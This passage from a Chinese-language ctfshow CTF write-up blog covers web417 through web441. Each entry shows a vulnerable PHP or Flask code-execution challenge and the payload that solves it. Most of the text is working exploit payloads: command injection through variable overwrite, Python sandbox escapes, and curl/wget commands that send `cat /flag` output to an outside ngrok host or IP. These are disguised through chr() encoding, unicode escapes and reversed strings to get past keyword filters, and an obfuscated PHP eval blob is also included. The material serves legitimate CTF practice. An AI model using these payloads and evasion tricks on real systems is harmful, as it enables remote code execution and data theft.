utf-8 -*- Author: h1xa Date:   2021-01-25 23:07:21 Last Modified by:   h1xa Last Modified time: 2021-01-26 19:54:23 email: h1xa@ctfer.com link: https://ctfer.com*/error_reporting(0);highlight_file(__FILE__);class ctf&#123;    public function getflag()&#123;        return &#39;fake flag&#39;;    &#125;    final public function flag()&#123;        echo file_get_contents(&#39;flag.php&#39;);    &#125;&#125;class show extends ctf&#123;    public function __construct($f)&#123;        call_user_func($f);    &#125;&#125;echo new show($_GET[f]);</code></pre><pre><code class="php">?f=ctf::flag</code></pre><h1 id="web417"><a href="#web417" class="headerlink" title="web417"></a>web417</h1><pre><code class="php">&lt;?php /*ctfshow*/define(&#39;aPeKTP0126&#39;, __FILE__);$cIYMfW = urldecode(&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;);$CBhSfw = $cIYMfW[3] . $cIYMfW[6] . $cIYMfW[33] . $cIYMfW[30];$xWoIVy = $cIYMfW[33] . $cIYMfW[10] . $cIYMfW[24] . $cIYMfW[10] . $cIYMfW[24];$RkEEuV = $xWoIVy[0] . $cIYMfW[18] . $cIYMfW[3] . $xWoIVy[0] . $xWoIVy[1] . $cIYMfW[24];$YFfKrW = $cIYMfW[7] . $cIYMfW[13];$CBhSfw .= $cIYMfW[22] . $cIYMfW[36] . $cIYMfW[29] . $cIYMfW[26] . $cIYMfW[30] . $cIYMfW[32] . $cIYMfW[35] . $cIYMfW[26] . $cIYMfW[30];eval($CBhSfw(&quot;JGpYanRLZD0ianBRRHVrYkd3eW5abWlWek1mc0pDb0hGTnJxSUJTaGRQQXhMT0tFZ1d0dlVUZVJYYVlsY1RjUkNadW5WbWpHVUtIZUlmT2RZWHNEa1NwTVFFaXR4TnJBbHphcXdQQmJKZ0Z2V295aExOQzltb0Ryd1VWZUtvUDVoYVh4YWl1dnRGaGZtZmdRMllqQXRKVmVsZWtybWZnUTJhZ2R1eWV2M1VHRWxOV2VqblZ2aHkyOXVVaXdIWWdVa2ZpSjNSaUoyZkhKanZISjJ2WEoyZmdKaFNKZmhTSXloU0lSbVlneTVmVHdoZnVSaFNJcmhTSXdoU0lKaFNJcWhTSXVoZnVxMllnVUNZZ0xqWWdVWFlneTBZZ3kzemlKMXZISjJTaUoyelhKMmZqSjNmakozU2pKMnZUUmhmdVFoU1R5SVNqSjJSaVFjemp2U0ozVVpnR3c5WVZrSngyVW1pMWRJV2k0dXlldjNVR0VsUElVeGxIdnRlRHhLTHFCbmZJU3hsSHZ0ZUR4S0xxQm5mSUV4emp2VG9rdkpGUGY5WVZrSngyVW1pMWRJZjEwWllWa0p4MlVtaTFkQWZrMFpZVmtKeDJVbWkxZGpTazBaWVZrSngyVW1pMWRBZmswWllWa0p4MlVtaTFkalNrMDdZREVYSkRrNHZUMHV5MnRKZURoVFBJRXhsSHZ0ZUR4S0xxQm5mZ3R4bEh2dGVEeEtMcUJuZjEwWllWU3Nla3Y1eTFkbVdpNHV5MnRKZURoVFBJa3hsSHZ0ZUR4S0xxQm5mVHZ4emp2Q2VHRUJlM1E5WVZrSngyVW1pMWQzV2k0dXlldjNVR0VsUElxSVdnZHVnZVMybnU1NGxUMHV5ZXYzVUdFbFBJUWpXaTR1eWV2M1VHRWxQSWYyV2k0dXlldjNVR0VsUElRNVdpNHV5ZXYzVUdFbFBJUTJXaTR1eWV2M1VHRWxQSWZtV2k0dXlldjNVR0VsUElmaldpNHV5ZXYzVUdFbFBJZjFXaTR1eWV2M1VHRWxQSVEyV2k0dXlldjNVR0VsUElmbVdnQmh4S2tkYVh2U0ozVVpnR3dzUXVjVm5EZWd2V0VCVURzbW9QZVBSdTFIZjA1QVVxZXVTa1VkVWtjV2lxWU15SlVQdmVKbW5xWWVvMDVOUEswQWllY1F2dVV1ZmhVY3l1dG9naGVQTERZdGVXdlJVUDVQUjFVRFVxQlRvMWNzeUsxMG9WU2RKaHR0blB3MXlJa21SaFNwU0pjUG5oWVJVSng0TGtTREpLNXZma2NRZUpKQXhlZUJmZXZUZWhVaVVreG9TaHhlRnFldW51WVZQaFVzb2hmbWlLaHVmVGhzVUp2ZHhWUkFSdWhVZnVVM2d1Um1vSjhqZVRZVWUzeGJpR3M0YTBjNVNWQkpldTRqeUtkMVNxQkNKS2N0dmhZZVVleFNuMGNRUnVTZWlxeTBKS2hHbzF4V1NKaGduZXNJZ3FTaXZrVVpSR3ZQZjBoQWdQaHBMMGNRUnVTZWlxeTBKS2hHbzF4V1NKaGduZXNJZ3FTaXZrVVpSR3ZQZjBoSWl1ZXplMlNEZmV0VG9QQklpdXRYUjFlUXZUdmlvUHhwZTFMMWllU0JQVFNmdnFrSWl1ZXplMlNEZmV0VG9QQm1pMVNwU2pRY2FnZC9OVG0vTFZ0bVFWdmhVS2haVWl3R0ZQdnRvMlUzZkNxalNITGR5ZUVoaTF2UmZDcWpTSHU3WXExc0ZreGhSVDExTEtBdVVQU2JVVkpzUUhKMnZncWhTMHFoU1RRaGZ1eWhTdVJoU1RxMVlnZUNZZ0wyWWdMMGZYSjJ6Z1E0WWdZcVlnTG1ZZ0w0WWdMMVlnTEFZZ0w1WWdZRVNISjJSakozZkhKMlJISjJTWEoyU0l1aFNKeWhTVEpoU1R3aFNUZmhTSWZoU0lMaFN1eTBZZ1lYWWd5MmZJTGhTdXFIYWdkdVUyMUhna3Z1Tml2U29EdFdVSlluZjEwWllxMXNGa3hoUmhkMldpNHVnUHQ0ZTJlWFBJZklXaTR1Z1B0NGUyZVhQSWZtV2dkdUZLZXFnVmNvTml2U29EdFdVSlluZklTeGxIdlNvRHRXVUpZbmZnRXhsSHZTb0R0V1VKWW5mVHZ4bEh2U29EdFdVSlluZmdFeGxIdlNvRHRXVUpZbmZUdnh6anZkaWVjREowdTlZRGNodnFBTVBoZG1XaTR1Z1B0NGUyZVhQSXE0V2k0dWdQdDRlMmVYUElTeGxIdjZVSnZmb2hjbmZrMFpZRGNodnFBTVBoZEFXaTR1Z1B0NGUyZVhQSVEwV2dkdXZHZUF5V2VvTml2U29EdFdVSlluUzEwWllxMXNGa3hoUmhkQWYxMDdZVnhCeXVBSlVYNDlZcTFzRmt4aFJoZGpmaDBaWXExc0ZreGhSaGRJU2gwWllxMXNGa3hoUmhkanplMFpZcTFzRmt4aFJoZGpTaDBaWXExc0ZreGhSaGRJZmswWllxMXNGa3hoUmhkSWZoMFpZcTFzRmt4aFJoZElTZTBaWXExc0ZreGhSaGRqU2gwWllxMXNGa3hoUmhkSWZrMDdVV1V0blh3dVUyMUhna3Z1YVhZYXZnZTN5aHhtaVBTSmZWaHZvMFUzZWVlNG9LZVBnSzVUbzNFMlB1ZWlma2hwVWtjdWYwNXNQS0FveWVlVmVoZUhvMWNJeWVVYUZWZXB4cXZIZTFVUnlKeG1Ta3hRZXU5dW8xVXl5Z0VzZ2hTUEp1dnRlSWtsVWV4b2Vra3lnaGt1dld2Z1BURXNpaGNQZWhjSHZ1eUlKSzVYZmV2V29rdEp2R0VNUHV0c1NLU2VpR1lUbmdoa0poSjFmaFJqaWh4SG5WdFF5UDFWeDFlTW5rVUh2UHZxZUNTVlJ1MVFMcUJvbmhZUnkxVW1MZWtlTGt2dXYydnNKMUo1b2VZcG5xMXVvMXMwVXFlVmdrdkJndVNnb0lrWEplZW1lVnZEVWtTSFBrWWtQZVVvZWVVa3hxOVVmMVlZZ2dZa2ZoaGVucVlpZTN2YWVLZDVGa3hCTHFZSGVoY015VEUwaUt2SlBLdFRlSjVYeVBCaXZrY0JMa3ZTdmhVQWVXY1huZVJBZ3V2b25XcjBVcVVQSlZlUUpLMXRuZ0UzVVAxVm5lVWtndTVnZUtSMEpJU1ZlZVJtVTNoVWZLQURKUEI0Z2VZWnZoZVduV3Z6VXFlVm9WU1BKVEV0b0llMnlUa2F4VnZrSkt0UG5rWUFQaEoxSnExRHZoeFNlMGNESjFlNFIyWURTZ1NXdjBVUVBnWWRpUFlaZWdZVWV1Y3NlaHhtdmVVQlVEa2Vua2NaeVBCaW5ra1dMcWV2RmhjUmVreGtmS2twSkdrSmYwVXR5UEJWeGtTeVVWNW9lSWVTZTF0YXllVVFKR2tKbmdoMnloZWRKcTFrUHVTdWZoY2xKUGQ1b2VTRGZEeGhuSlVCZXVlemllU2VGQ1lIaVZ3bUpleDRpa2g2UlRlaWZLOGpKMjFVU2VZa3hxY2lvM3cxZTJjUHZlU3FpV3hKZjBVWGdKdG1TaHhNb2tFVGVKc0lQSzVkUjA5V1B1OVNmSllTVWVlcFNlY3B4cWNKaWtjRFBLQlZlS2VwZmVjSmYwVUNlcXRvbnExcGVXdGlvMm1BVXFVRUZlWWRuVkFIbkttalVlZWR4aFVQUksxV3ZWdmd5aHRpUGVjeVUzeFd2Z3YzSklrdWYxeUFuVjlvZXE1TUpQQUVGcTFxVWtTSGUyQW1KS0FtUmh4RGVUdlN2VkF2Z2dyNWZrU3FnVGV0aURFTmUxSjVGa2tlRnExb2VxYzJQUDFWRmt1bWl1aGdlS3ZieTJBZXgyZWR2R2V1ZlBtMWdQNVRmMWVCZmdFZXZlYzFlQ1NpaWVjcGdLOVVmUHRWZXV4U0ZxOXlpdTVTZTA1aWVna29mMUpqZ2h2aGVWdmd5aHhwU0poTXhWQXVuSlVJaTBTVGwxRWN5M2VhdjJ2MFBQQjRlZWNDVTJCaG5lVWtlcXhteUpCQ0pHU2dlR0VRZWdFcG4wY2tTV3hIZTNFWXkxUzNvMVlaZUd0VVBrVXRpMmNZTHFBQ0pHU2dlR0VRZWdFcG4wY2tTV3hIZTNFWXkxUzNvMVlaZUd0VVBrVXRncVNpdjJ2eXZLdHVlSzltZ3FTaUwxU1BMcXRlZlZCYml1SjF4MllXTHFoVEozeDNncVNpdjJ2eXZLdHVlSzltaTFTcExxOTNOZzBIYWl1N05JND0iO2V2YWwoJz8+Jy4kQ0JoU2Z3KCR4V29JVnkoJFJrRUV1VigkalhqdEtkLCRZRmZLclcqMiksJFJrRUV1VigkalhqdEtkLCRZRmZLclcsJFlGZktyVyksJFJrRUV1VigkalhqdEtkLDAsJFlGZktyVykpKSk7&quot;)); ?&gt;</code></pre><p>调试一下</p><pre><code class="php">include(&#39;flag.php&#39;);$c=$_GET[&#39;ctf&#39;];if($c==&#39;show&#39;)&#123;    echo $flag;&#125;else&#123;    echo &#39;FLAG_NOT_HERE&#39;;&#125;?&gt;</code></pre><h1 id="web418"><a href="#web418" class="headerlink" title="web418"></a>web418</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-01-25 23:07:21 Last Modified by:   h1xa Last Modified time: 2021-01-26 23:52:58 email: h1xa@ctfer.com link: https://ctfer.com*/$key= 0;$clear=&#39;clear.php&#39;;highlight_file(__FILE__);//获取参数$ctfshow=$_GET[&#39;ctfshow&#39;];//包含清理脚本include($clear);extract($_POST);if($key===0x36d)&#123;    //帮黑阔写好后门    eval(&#39;&lt;?php &#39;.$ctfshow.&#39;?&gt;&#39;);&#125;else&#123;    $die?die(&#39;FLAG_NOT_HERE&#39;):clear($clear);&#125;function clear($log)&#123;    shell_exec(&#39;rm -rf &#39;.$log);&#125;Notice: Undefined index: ctfshow in /var/www/html/index.php on line 18FLAG_NOT_HERE</code></pre><p>注意代码</p><p>给的后门没法用，需要变量覆盖然后利用shell_exec</p><pre><code class="php">die=0&amp;clear=;cp flag.php flag.txt</code></pre><p>然后访问flag.txt即可</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415141929631.png" alt="image-20220415141929631"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415141935770.png" alt="image-20220415141935770"></p><h1 id="web419"><a href="#web419" class="headerlink" title="web419"></a>web419</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-01-25 23:07:21 Last Modified by:   h1xa Last Modified time: 2021-01-29 01:36:24 email: h1xa@ctfer.com link: https://ctfer.com*/highlight_file(__FILE__);$code = $_POST[&#39;code&#39;];if(strlen($code) &lt; 17)&#123;    eval($code);&#125;Notice: Undefined index: code in /var/www/html/index.php on line 18</code></pre><pre><code class="php">code=`cp f* f.txt`;</code></pre><pre><code class="php">code=eval($_POST[1]);&amp;1=system(&#39;cat flag.php&#39;);</code></pre><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415142122553.png" alt="image-20220415142122553"></p><h1 id="web420"><a href="#web420" class="headerlink" title="web420"></a>web420</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-01-25 23:07:21 Last Modified by:   h1xa Last Modified time: 2021-01-29 01:41:05 email: h1xa@ctfer.com link: https://ctfer.com*/highlight_file(__FILE__);$code = $_POST[&#39;code&#39;];if(strlen($code) &lt; 8)&#123;    system($code);&#125;Notice: Undefined index: code in /var/www/html/index.php on line 18Warning: system(): Cannot execute a blank command in /var/www/html/index.php on line 20</code></pre><p>ls找了几个目录发现在&#x2F;var&#x2F;www下（ls …&#x2F;）</p><pre><code class="php">code=nl ../*</code></pre><p>还有一种方法，可以参考下大佬写的<a href="https://www.cnblogs.com/-chenxs/p/11981586.html">文章</a><br> 比如我们想执行 cat index.php,可以依次执行如下命令</p><pre><code class="php">&gt;php\\&gt;dex.\\&gt;\ in\\&gt;cat\\</code></pre><p>接着执行ls -t &gt;0<br> 这样的话文件0中的内容就是 cat index.php<br> 最后利用sh 0 来执行就可以了</p><pre><code class="php">import requestsimport timepayload = [    &#39;&gt;sh &#39;,    &#39;&gt;ba\\&#39;,    &#39;&gt;\|\\&#39;,    &#39;&gt;2\\&#39;,    &#39;&gt;2x\\&#39;,    &#39;&gt;xxx.\\&#39;,    &#39;&gt;9x.\\&#39;,    &#39;&gt;1\\&#39;,    &#39;&gt;2.\\&#39;,    &#39;&gt;4\\&#39;,    &#39;&gt;\ \\&#39;,    &#39;&gt;curl\\&#39;,    # &#39;&gt;cu\\&#39;,]for i in payload:    # assert len(i) &lt;= 8    data = &#123;        &#39;code&#39;: str(i)    &#125;    r = requests.post(&#39;http://6171141f-4d7c-447c-b0f6-1c92f0abd9be.chall.ctf.show/&#39;, data=data)    print(i)    time.sleep(1)</code></pre><h1 id="web421"><a href="#web421" class="headerlink" title="web421"></a>web421</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-01-25 23:07:21 Last Modified by:   h1xa Last Modified time: 2021-01-29 01:42:50 email: h1xa@ctfer.com link: https://ctfer.com*/highlight_file(__FILE__);$code = $_POST[&#39;code&#39;];if(strlen($code) &lt; 6)&#123;    system($code);&#125;Notice: Undefined index: code in /var/www/html/index.php on line 18Warning: system(): Cannot execute a blank command in /var/www/html/index.php on line 20</code></pre><pre><code class="php">code=nl *</code></pre><h1 id="web422"><a href="#web422" class="headerlink" title="web422"></a>web422</h1><pre><code class="php"> &lt;?php/*# -*- coding: utf-8 -*- Author: h1xa Date:   2021-01-25 23:07:21 Last Modified by:   h1xa Last Modified time: 2021-01-29 01:42:50 email: h1xa@ctfer.com link: https://ctfer.com*/highlight_file(__FILE__);$code = $_POST[&#39;code&#39;];if(strlen($code) &lt; 5)&#123;    system($code);&#125;Notice: Undefined index: code in /var/www/html/index.php on line 18Warning: system(): Cannot execute a blank command in /var/www/html/index.php on line 20</code></pre><pre><code class="php">code=nl *</code></pre><h1 id="we4b23"><a href="#we4b23" class="headerlink" title="we4b23"></a>we4b23</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415143111800.png" alt="image-20220415143111800"></p><pre><code class="php">from flask import Flaskfrom flask import requestimport osapp = Flask(__name__)@app.route(&#39;/&#39;)def app_index():    code = request.args.get(&#39;code&#39;)    if code:        return eval(code)    return &#39;where is flag?&lt;!-- /?code --&gt;&#39;if __name__==&quot;__main__&quot;:    app.run(host=&#39;0.0.0.0&#39;,port=80)</code></pre><pre><code class="php">?code=str(&#39;&#39;.__class__.__bases__[0].__subclasses__()[185].__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).__dict__[&#39;pop&#39;+&#39;en&#39;](&#39;curl http://xx.xx.xx.xx?1=`cat /flag`&#39;))</code></pre><p>下面的题都是python的命令执行的，因为下面代码中的return需要返回的是字符串，所以不是字符串的我们就用str函数转换一下就好了。</p><pre><code class="破坏p">?code=os.popen(&#39;ls /&#39;).read()?code=os.popen(&#39;cat /flag&#39;).read()</code></pre><h1 id="web424"><a href="#web424" class="headerlink" title="web424"></a>web424</h1><pre><code class="php">from flask import Flaskfrom flask import requestapp = Flask(__name__)@app.route(&#39;/&#39;)def app_index():    code = request.args.get(&#39;code&#39;)    if code:        return eval(code)    return &#39;where is flag?&lt;!-- /?code --&gt;&#39;if __name__==&quot;__main__&quot;:    app.run(host=&#39;0.0.0.0&#39;,port=80)</code></pre><pre><code class="跑hp">?code=open(&#39;/flag&#39;).read()</code></pre><h1 id="web425"><a href="#web425" class="headerlink" title="web425"></a>web425</h1><pre><code class="php">from flask import Flaskfrom flask import requestapp = Flask(__name__)@app.route(&#39;/&#39;)def app_index():    code = request.args.get(&#39;code&#39;)    if code:        if &#39;os&#39; not in code:            return eval(code)    return &#39;where is flag?&lt;!-- /?code --&gt;&#39;if __name__==&quot;__main__&quot;:    app.run(host=&#39;0.0.0.0&#39;,port=80)</code></pre><pre><code class="php">?code=open(&#39;/flag&#39;).read()</code></pre><h1 id="web426"><a href="#web426" class="headerlink" title="web426"></a>web426</h1><pre><code class="php">from flask import Flaskfrom flask import requestimport reapp = Flask(__name__)@app.route(&#39;/&#39;)def app_index():    code = request.args.get(&#39;code&#39;)    if code:        reg = re.compile(r&#39;os|popen&#39;)        if reg.match(code)==None:            return eval(code)    return &#39;where is flag?&lt;!-- /?code --&gt;&#39;if __name__==&quot;__main__&quot;:    app.run(host=&#39;0.0.0.0&#39;,port=80)</code></pre><pre><code class="php">?code=open(&#39;/flag&#39;).read()</code></pre><h1 id="web427"><a href="#web427" class="headerlink" title="web427"></a>web427</h1><pre><code class="php">from flask import Flaskfrom flask import requestimport reapp = Flask(__name__)@app.route(&#39;/&#39;)def app_index():    code = request.args.get(&#39;code&#39;)    if code:        reg = re.compile(r&#39;os|popen|system&#39;)        if reg.match(code)==None:            return eval(code)    return &#39;where is flag?&lt;!-- /?code --&gt;&#39;if __name__==&quot;__main__&quot;:    app.run(host=&#39;0.0.0.0&#39;,port=80)</code></pre><pre><code class="php">?code=open(&#39;/flag&#39;).read()</code></pre><h1 id="web428"><a href="#web428" class="headerlink" title="web428"></a>web428</h1><pre><code class="php">from flask import Flaskfrom flask import requestimport reapp = Flask(__name__)@app.route(&#39;/&#39;)def app_index():    code = request.args.get(&#39;code&#39;)    if code:        reg = re.compile(r&#39;os|popen|system|read&#39;)        if reg.match(code)==None:            return eval(code)    return &#39;where is flag?&lt;!-- /?code --&gt;&#39;if __name__==&quot;__main__&quot;:    app.run(host=&#39;0.0.0.0&#39;,port=80)</code></pre><pre><code class="php">?code=open(&#39;/flag&#39;).read()</code></pre><h1 id="web429"><a href="#web429" class="headerlink" title="web429"></a>web429</h1><pre><code class="php">from flask import Flaskfrom flask import requestimport reapp = Flask(__name__)@app.route(&#39;/&#39;)def app_index():    code = request.args.get(&#39;code&#39;)    if code:        reg = re.compile(r&#39;os|open|system|read&#39;)        if reg.match(code)==None:            return eval(code)    return &#39;where is flag?&lt;!-- /?code --&gt;&#39;if __name__==&quot;__main__&quot;:    app.run(host=&#39;0.0.0.0&#39;,port=80)</code></pre><pre><code class="php">?code= open(&#39;/flag&#39;).read()</code></pre><p>匹配有问题,前面加个空格</p><h1 id="web430"><a href="#web430" class="headerlink" title="web430"></a>web430</h1><pre><code class="php">from flask import Flaskfrom flask import requestimport reapp = Flask(__name__)@app.route(&#39;/&#39;)def app_index():    code = request.args.get(&#39;code&#39;)    if code:        reg = re.compile(r&#39;os|open|system|read|eval&#39;)        if reg.match(code)==None:            return eval(code)    return &#39;where is flag?&lt;!-- /?code --&gt;&#39;if __name__==&quot;__main__&quot;:    app.run(host=&#39;0.0.0.0&#39;,port=80)</code></pre><pre><code class="php">?code= open(&#39;/flag&#39;).read()</code></pre><h1 id="web431"><a href="#web431" class="headerlink" title="web431"></a>web431</h1><pre><code class="php">from flask import Flaskfrom flask import requestimport reapp = Flask(__name__)@app.route(&#39;/&#39;)def app_index():    code = request.args.get(&#39;code&#39;)    if code:        reg = re.compile(r&#39;os|open|system|read|eval|str&#39;)        if reg.match(code)==None:            return eval(code)    return &#39;where is flag?&lt;!-- /?code --&gt;&#39;if __name__==&quot;__main__&quot;:    app.run(host=&#39;0.0.0.0&#39;,port=80)</code></pre><pre><code class="php">?code= open(&#39;/flag&#39;).read()</code></pre><h1 id="web432"><a href="#web432" class="headerlink" title="web432"></a>web432</h1><p>过滤</p><pre><code class="php">os|open|system|read|eval</code></pre><pre><code class="php">nc -lvp 80</code></pre><pre><code class="php">?code=str(__builtins__.__dict__[&#39;__impo&#39;%2b&#39;rt__&#39;](&#39;o&#39;%2b&#39;s&#39;).__getattribute__(&#39;syste&#39;%2b&#39;m&#39;)(&#39;curl http://b423-111-17-194-91.ngrok.io:80?p=`cat /f*`&#39;))</code></pre><pre><code class="php">?code=str(&#39;&#39;.__class__.__bases__[0].__subclasses__()[185].__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).__dict__[&#39;pop&#39;+&#39;en&#39;](&#39;curl http://xx.xx.xx.xx?1=`cat /flag`&#39;))</code></pre><h1 id="web433"><a href="#web433" class="headerlink" title="web433"></a>web433</h1><p>过滤</p><pre><code class="php">os|open|system|read|eval|builtins</code></pre><pre><code class="php">?code=str(__import__(&#39;so&#39;[::-1]).__getattribute__(&#39;syste&#39;%2b&#39;m&#39;)(&#39;curl http://b423-111-17-194-91.ngrok.io:80?p=`cat /f*`&#39;))</code></pre><pre><code class="php">?code=str(&#39;&#39;.__class__.__bases__[0].__subclasses__()[185].__init__.__globals__[&#39;__buil&#39;&#39;tins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).__dict__[&#39;pop&#39;+&#39;en&#39;](&#39;curl http://xx.xx.xx.xx?1=`cat /flag`&#39;))</code></pre><h1 id="web434"><a href="#web434" class="headerlink" title="web434"></a>web434</h1><pre><code class="php">os|open|system|read|eval|builtins|curl</code></pre><pre><code class="php">?code=str(__import__(&#39;so&#39;[::-1]).__getattribute__(&#39;syste&#39;%2b&#39;m&#39;)(&#39;cu&#39;%2b&#39;rl http://b423-111-17-194-91.ngrok.io:80?p=`cat /f*`&#39;))</code></pre><pre><code class="php">?code=str(&#39;&#39;.__class__.__bases__[0].__subclasses__()[185].__init__.__globals__[&#39;__buil&#39;&#39;tins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).__dict__[&#39;pop&#39;+&#39;en&#39;](&#39;wget http://xx.xx.xx.xx?1=`cat /fl*`&#39;))</code></pre><h1 id="web435"><a href="#web435" class="headerlink" title="web435"></a>web435</h1><p>过滤</p><pre><code class="php">os|open|system|read|eval|builtins|curl|_</code></pre><pre><code class="php">?code=str(exec(&#39;import o\x73;o\x73.\x73ystem(\&quot;\\u0063\\u0075\\u0072\\u006c\\u0020\\u0068\\u0074\\u0074\\u0070\\u003a\\u002f\\u002f\\u0034\\u0032\\u002e\\u0031\\u0039\\u0032\\u002e\\u0031\\u0033\\u0037\\u002e\\u0032\\u0031\\u0032\\u003f\\u0031\\u003d\\u0060\\u0063\\u0061\\u0074\\u0020\\u002f\\u0066\\u006c\\u0061\\u0067\\u0060\&quot;)&#39;))&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&#123;9:c&#125;&#123;10:c&#125;&#123;11:c&#125;&#123;12:c&#125;&#123;13:c&#125;&#123;14:c&#125;&#123;15:c&#125;&#123;16:c&#125;&#123;17:c&#125;&#123;18:c&#125;&#123;19:c&#125;&#123;20:c&#125;&#123;21:c&#125;&#123;22:c&#125;&#123;23:c&#125;&#123;24:c&#125;&#123;25:c&#125;&#123;26:c&#125;&#123;27:c&#125;&#123;28:c&#125;&#123;29:c&#125;&#123;30:c&#125;&#123;31:c&#125;&#123;32:c&#125;&#123;33:c&#125;&#123;34:c&#125;&#123;35:c&#125;&#123;36:c&#125;&#123;37:c&#125;&#123;38:c&#125;&#123;39:c&#125;&#123;40:c&#125;&#123;41:c&#125;&#123;42:c&#125;&#123;43:c&#125;&#123;44:c&#125;&#123;45:c&#125;&#123;46:c&#125;&#123;47:c&#125;&#123;48:c&#125;&#123;49:c&#125;&#123;50:c&#125;&#123;51:c&#125;&#123;52:c&#125;&#123;53:c&#125;&#123;54:c&#125;&#123;55:c&#125;&#123;56:c&#125;&#123;57:c&#125;&#123;58:c&#125;&#123;59:c&#125;&#123;60:c&#125;&#123;61:c&#125;&#123;62:c&#125;&quot;.format(105,109,112,111,114,116,32,111,115,59,111,115,46,115,121,115,116,101,109,40,34,99,117,114,108,32,104,116,116,112,58,47,47,52,50,46,49,57,50,46,49,51,55,46,50,49,50,63,49,61,96,99,97,116,32,47,102,108,97,103,96,34,41)s = &#39;import os;os.system(&quot;curl http://b423-111-17-194-91.ngrok.io:80?1=`cat /flag`&quot;)&#39;res = &#39;&quot;&#39;j = 0for i in s:    res += (&quot;&#123;&quot;+f&quot;&#123;j&#125;:c&quot;+&quot;&#125;&quot;)    j += 1res += &#39;&quot;.format(&#39;j = 0for i in s:    res += f&#39;&#123;ord(i)&#125;,&#39;    j += 1res = res[:-1]res = res+&quot;)&quot;print(res)print(eval(res))</code></pre><pre><code class="php">?code=str(exec(&#39;)&quot;`*f/ tac`=p?08:oi.korgn.19-491-71-111-324b//:ptth lruc&quot;(metsys.so ;so tropmi&#39;[::-1]))</code></pre><h1 id="web436-439"><a href="#web436-439" class="headerlink" title="web436-439"></a>web436-439</h1><pre><code class="php">436过滤了os|open|system|read|eval|builtins|curl|_|getattr437过滤了os|open|system|read|eval|builtins|curl|_|getattr438过滤了os|open|system|read|eval|builtins|curl|_|getattr|&#123;439过滤了os|open|system|read|eval|builtins|curl|_|getattr|&#123;</code></pre><pre><code class="php">?code=str(exec(&#39;)&quot;`*f/ tac`=p?08:oi.korgn.19-491-71-111-324b//:ptth lruc&quot;(metsys.so ;so tropmi&#39;[::-1]))</code></pre><h1 id="web440"><a href="#web440" class="headerlink" title="web440"></a>web440</h1><p>过滤了</p><pre><code class="php">os|open|system|read|eval|builtins|curl|_|getattr|&#123;|&#39;|&quot;</code></pre><p>没有了引号，我们可以用chr构造字符串</p><pre><code class="php">s=&quot;__import__(&#39;os&#39;).system(&#39;curl http://b423-111-17-194-91.ngrok.io:80?p=`cat /f*`&#39;)&quot;def ccchr(s):    t=&#39;&#39;    for i in range(len(s)):        if i&lt;len(s)-1:            t+=&#39;chr(&#39;+str(ord(s[i]))+&#39;)%2b&#39;        else:            t+=&#39;chr(&#39;+str(ord(s[i]))+&#39;)&#39;    return tprint(&#39;?code=str(exec(&#39;+ccchr(s)+&#39;))&#39;)#?code=str(exec(chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)%2bchr(40)%2bchr(39)%2bchr(111)%2bchr(115)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(115)%2bchr(121)%2bchr(115)%2bchr(116)%2bchr(101)%2bchr(109)%2bchr(40)%2bchr(39)%2bchr(99)%2bchr(117)%2bchr(114)%2bchr(108)%2bchr(32)%2bchr(104)%2bchr(116)%2bchr(116)%2bchr(112)%2bchr(58)%2bchr(47)%2bchr(47)%2bchr(98)%2bchr(52)%2bchr(50)%2bchr(51)%2bchr(45)%2bchr(49)%2bchr(49)%2bchr(49)%2bchr(45)%2bchr(49)%2bchr(55)%2bchr(45)%2bchr(49)%2bchr(57)%2bchr(52)%2bchr(45)%2bchr(57)%2bchr(49)%2bchr(46)%2bchr(110)%2bchr(103)%2bchr(114)%2bchr(111)%2bchr(107)%2bchr(46)%2bchr(105)%2bchr(111)%2bchr(58)%2bchr(56)%2bchr(48)%2bchr(63)%2bchr(112)%2bchr(61)%2bchr(96)%2bchr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(42)%2bchr(96)%2bchr(39)%2bchr(41)))</code></pre><h1 id="web441"><a href="#web441" class="headerlink" title="web441"></a>web441</h1><p>在上面的方法上用request进行了优化</p><pre><code class="php">?code=str(exec(request.args.get(chr(97))))&amp;a=__import__(&#39;os&#39;).system(&#39;curl http://b423-111-17-194-91.ngrok.io:80?p=`cat /f*`&#39;)</code></pre><pre><code class="php">str().join([chr(105),chr(109),chr(112),chr(111),chr(114),chr(116),chr(32),chr(111),chr(115),chr(59),chr(111),chr(115),chr(46),chr(115),chr(121),chr(115),chr(116),chr(101),chr(109),chr(40),chr(34),chr(99),chr(117),chr(114),chr(108),chr(32),chr(104),chr(116),chr(116),chr(112),chr(58),chr(47),chr(47),chr(52),chr(50),chr(46),chr(49),chr(57),chr(50),chr(46),chr(49),chr(51),chr(55),chr(46),chr(50),chr(49),chr(50),chr(63),chr(49),chr(61),chr(96),chr(99),chr(97),chr(116),chr(32),chr(47),chr(102),chr(108),chr(97),chr(103),chr(96),chr(34),chr(41)])</code></pre><h1 id="web442"><a href="#web442" class="headerlink" 